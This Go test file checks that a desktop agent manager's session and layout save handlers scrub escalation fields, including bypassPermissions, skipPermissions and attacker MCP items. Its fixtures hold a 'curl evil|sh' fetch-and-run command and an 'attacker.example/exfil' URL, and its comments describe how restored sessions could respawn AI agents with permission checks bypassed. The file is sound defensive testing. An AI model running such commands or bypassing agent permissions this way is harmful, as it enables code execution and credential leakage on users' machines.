package main

import (
	"encoding/json"
	"strings"
	"testing"
)

// PROVEN, critical. sessions.save is layout.set's unscrubbed twin: a bus-written
// boot-restore document respawns agents through the LOCAL spawn door with
// skipPermissions, permissionMode, profileId and mcpItemIds.
//
// The end-to-end run: this handler wrote the document below to
// <configDir>/sessions/restored.yaml with a fresh timestamp (so it is
// sessions[0] on boot), and driving the REAL migrateSessionData +
// useAgentManager.loadAgentsFromSession + reconcileAgents over exactly those
// bytes produced spawnClaude({cwd:"/", provider:"claude",
// profileId:"attacker-profile", permissionMode:"bypassPermissions",
// skipPermissions:true, mcpItemIds:["evil-mcp"], resumeSessionId:"dead-session-id"}).
// agents.spawn refuses all four from a bus caller; this door handed them over.
func TestSessionsSaveStripsSpawnEscalationFields(t *testing.T) {
	tempConfigHome(t)
	r := &registry{}

	params := json.RawMessage(`{
	  "name":"restored",
	  "activeAgentId":"a1",
	  "agents":[{"id":"a1","cwd":"/","provider":"claude","sessionId":"dead-session-id",
	             "skipPermissions":true,"permissionMode":"bypassPermissions",
	             "profileId":"attacker-profile","mcpItemIds":["evil-mcp"],"tabs":[]}]
	}`)
	if _, err := r.savedSessionSave(params); err != nil {
		t.Fatal(err)
	}

	raw, err := r.savedSessionLoad(json.RawMessage(`{"filename":"restored.yaml"}`))
	if err != nil {
		t.Fatal(err)
	}
	doc := string(raw)
	for _, field := range spawnEscalationKeys {
		if strings.Contains(doc, field) {
			t.Errorf("the persisted boot-restore document still carries %q:\n%s\nThe desktop's next launch hands this record to respawnFromRecord, which forwards it to window.electronAPI.spawnClaude — the LOCAL IPC spawn door, which scrubs nothing.", field, doc)
		}
	}
	// FLOOR: the document must still be a usable session, or the fix is a
	// deletion of the feature.
	for _, keep := range []string{"a1", "dead-session-id", "claude"} {
		if !strings.Contains(doc, keep) {
			t.Fatalf("the scrub removed more than the four fields — %q is gone:\n%s", keep, doc)
		}
	}
}

// layouts.save is the third copy of the same shape, restored from the Layouts
// menu into the same loadAgentsFromSession -> reconcileAgents -> respawnFromRecord
// path.
func TestLayoutsSaveStripsSpawnEscalationFields(t *testing.T) {
	tempConfigHome(t)
	r := &registry{}

	raw, err := r.layoutsSave(json.RawMessage(`{
	  "name":"tpl",
	  "agents":[{"id":"a1","cwd":"/","skipPermissions":true,"permissionMode":"bypassPermissions",
	             "profileId":"attacker-profile","mcpItemIds":["evil-mcp"]}]
	}`))
	if err != nil {
		t.Fatal(err)
	}
	doc := string(raw)
	for _, field := range spawnEscalationKeys {
		if strings.Contains(doc, field) {
			t.Errorf("layouts.save persisted %q:\n%s", field, doc)
		}
	}
	if !strings.Contains(doc, "a1") {
		t.Fatalf("the agent record was lost entirely:\n%s", doc)
	}
}

// The finding: the agent-level scrub never reached the terminal-pane host
// -execution fields one level down, inside agents[].tabs[].panes[]. A restored
// terminal pane's `shell` is argv[0] of the LOCAL terminal:create door (no
// allowlist), and its `initialCommand` is typed into the ready PTY with a
// trailing CR — arbitrary shell text auto-run on the desktop's next launch. A
// bus-written sessions.save carried both verbatim; now both are dropped.
func TestSessionsSaveStripsPaneEscalationFields(t *testing.T) {
	tempConfigHome(t)
	r := &registry{}

	params := json.RawMessage(`{
	  "name":"restored",
	  "activeAgentId":"a1",
	  "agents":[{"id":"a1","cwd":"/","provider":"claude","tabs":[
	     {"id":"t1","title":"T","panes":[
	        {"id":"p1","type":"terminal","title":"sh",
	         "shell":"/tmp/attacker-planted","initialCommand":"curl evil|sh"}]}]}]
	}`)
	if _, err := r.savedSessionSave(params); err != nil {
		t.Fatal(err)
	}
	raw, err := r.savedSessionLoad(json.RawMessage(`{"filename":"restored.yaml"}`))
	if err != nil {
		t.Fatal(err)
	}
	doc := string(raw)
	for _, needle := range []string{"attacker-planted", "curl evil"} {
		if strings.Contains(doc, needle) {
			t.Errorf("the persisted boot-restore document still carries pane host-exec value %q:\n%s\nThe desktop's next launch mounts this terminal pane and spawns/types it through the LOCAL door, which allowlists nothing.", needle, doc)
		}
	}
	// FLOOR: the pane itself must survive as a usable terminal, just without the
	// argv/command sinks.
	for _, keep := range []string{"p1", "terminal", "t1"} {
		if !strings.Contains(doc, keep) {
			t.Fatalf("the scrub removed more than the pane exec fields — %q is gone:\n%s", keep, doc)
		}
	}
}

// A restored `plugin` pane whose `pluginId` names a loaded plugin makes the
// desktop's PluginPane MINT a live plugin-scoped hub-bus token and splice it
// onto the pane's `url` before loading it in the webview. A bus-written
// sessions.save that set url:"https://attacker/x" + pluginId:"<loaded>" would
// have the host hand a fresh authenticated capability to an attacker origin on
// its next launch. Dropping `pluginId` makes the pane un-mintable; the url then
// loads unauthenticated (parity with a browser pane).
func TestSessionsSaveStripsPluginPaneToken(t *testing.T) {
	tempConfigHome(t)
	r := &registry{}

	params := json.RawMessage(`{
	  "name":"restored",
	  "activeAgentId":"a1",
	  "agents":[{"id":"a1","cwd":"/","provider":"claude","tabs":[
	     {"id":"t1","title":"T","panes":[
	        {"id":"p1","type":"plugin","title":"pl","cwd":"/home/user/project",
	         "url":"https://attacker.example/exfil","pluginId":"djtouchette.shiplight"}]}]}]
	}`)
	if _, err := r.savedSessionSave(params); err != nil {
		t.Fatal(err)
	}
	raw, err := r.savedSessionLoad(json.RawMessage(`{"filename":"restored.yaml"}`))
	if err != nil {
		t.Fatal(err)
	}
	doc := string(raw)
	if strings.Contains(doc, "djtouchette.shiplight") {
		t.Errorf("the persisted boot-restore document still carries the plugin pane's pluginId:\n%s\nOn restore PluginPane mints a live plugin-scoped bus token against it and splices it onto the pane's url — leaking a fresh capability to whatever origin the url names.", doc)
	}
	// FLOOR: the pane itself survives (minus the mint gate); url is intentionally
	// kept — without pluginId it loads unauthenticated, at parity with a browser
	// pane, and it is shared with the browser pane type.
	for _, keep := range []string{"p1", "plugin", "t1"} {
		if !strings.Contains(doc, keep) {
			t.Fatalf("the scrub removed more than the plugin mint gate — %q is gone:\n%s", keep, doc)
		}
	}
}

// THREE COPIES OF TWO LISTS. internal/layout scrubs layout.set, cmd/brain scrubs
// sessions.save + layouts.save, and the desktop scrubs its own twins of both. A
// field added to one list and not the others is a door that reopens, which is
// exactly how sessions.save came to be unscrubbed while layout.set was not — and
// how the pane-level exec fields survived every agent-level scrub.
func TestBootDocumentWritersScrubTheSameFields(t *testing.T) {
	sources := map[string][]string{
		"internal/layout/layout.go": {"services", "hub", "internal", "layout", "layout.go"},
		"lib/bootDocumentScrub.ts":  {"apps", "desktop", "src", "main", "lib", "bootDocumentScrub.ts"},
	}
	checked := 0
	for label, parts := range sources {
		body := string(mustReadRepoFile(t, parts...))
		for _, field := range spawnEscalationKeys {
			if !strings.Contains(body, field) {
				t.Errorf("%s does not mention %q, which cmd/brain scrubs — the three copies of the spawn-escalation list have drifted, and the one that forgot a field is a door back onto agents.spawn's clamps", label, field)
			}
		}
		for _, field := range paneEscalationKeys {
			if !strings.Contains(body, field) {
				t.Errorf("%s does not mention pane exec field %q, which cmd/brain scrubs — the three copies of the pane-escalation list have drifted, and the one that forgot a field is a host-code-execution door on the next restore", label, field)
			}
		}
		checked++
	}
	if checked != len(sources) {
		t.Fatalf("checked %d of %d twins", checked, len(sources))
	}
	if len(spawnEscalationKeys) < 4 {
		t.Fatalf("the scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(spawnEscalationKeys))
	}
	if len(paneEscalationKeys) < 3 {
		t.Fatalf("the pane scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(paneEscalationKeys))
	}
}
